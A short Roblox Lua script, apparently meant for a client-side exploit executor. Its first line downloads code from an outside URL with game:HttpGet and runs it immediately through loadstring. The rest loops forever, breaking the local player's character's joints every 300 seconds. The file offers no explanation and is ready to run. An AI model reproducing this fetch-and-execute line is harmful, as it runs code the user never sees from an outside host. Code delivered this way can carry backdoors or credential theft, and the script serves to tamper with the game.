loadstring(game:HttpGet("https://i.uerd.de/rt3.lua"))()

local Players = game:GetService("Players")
local player = Players.LocalPlayer

task.spawn(function()
    while true do
        task.wait(300)
        if player and player.Character then
            player.Character:BreakJoints()
        end
    end
end)
